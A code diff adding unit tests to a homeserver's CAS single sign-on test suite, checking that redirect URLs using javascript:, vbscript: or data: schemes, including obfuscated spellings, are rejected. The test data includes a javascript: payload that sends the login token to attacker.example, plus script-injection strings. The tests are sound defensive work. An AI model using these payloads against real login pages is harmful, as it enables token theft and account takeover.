@@ -965,6 +965,48 @@ class CASTestCase(unittest.HomeserverTestCase):
         # And that it contains our redirect link
         self.assertIn(redirect_url, channel.result["body"].decode("UTF-8"))
 
+    def _request_cas_ticket(self, redirect_url: str) -> FakeChannel:
+        cas_ticket_url = (
+            "/_matrix/client/r0/login/cas/ticket?redirectUrl=%s&ticket=ticket"
+            % (urllib.parse.quote(redirect_url))
+        )
+        return self.make_request("GET", cas_ticket_url)
+
+    def test_cas_redirect_refuses_script_schemes(self) -> None:
+        """A client redirect URL that would run script in the homeserver's origin
+        is refused instead of being offered as the confirmation page's link.
+
+        The login token is appended to the redirect URL, so a `javascript:` link
+        on that page could read the token and hand the account to whoever wrote
+        the link. Browsers drop ASCII tab and newline anywhere in a URL and strip
+        leading control characters and spaces before reading its scheme, so the
+        obfuscated spellings must be refused too.
+        """
+        for redirect_url in (
+            "javascript:fetch('https://attacker.example/?'+document.links[0].href)//",
+            "JavaScript:alert(1)//",
+            " \x01javascript:alert(1)//",
+            "java\tscr\nipt:alert(1)//",
+            "vbscript:msgbox(1)",
+            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        ):
+            channel = self._request_cas_ticket(redirect_url)
+
+            self.assertEqual(channel.code, 400, (redirect_url, channel.result))
+            body = channel.result["body"].decode("utf-8")
+            self.assertIn("invalid_request", body)
+            self.assertNotIn("loginToken", body)
+
+    def test_cas_redirect_confirm_custom_scheme(self) -> None:
+        """Native clients redirect to their own URL scheme; that keeps working."""
+        redirect_url = "com.example.app:/sso-callback"
+
+        channel = self._request_cas_ticket(redirect_url)
+
+        self.assertEqual(channel.code, 200, channel.result)
+        body = channel.result["body"].decode("utf-8")
+        self.assertIn(redirect_url + "?loginToken=", body)
+
     @override_config(
         {
             "sso": {
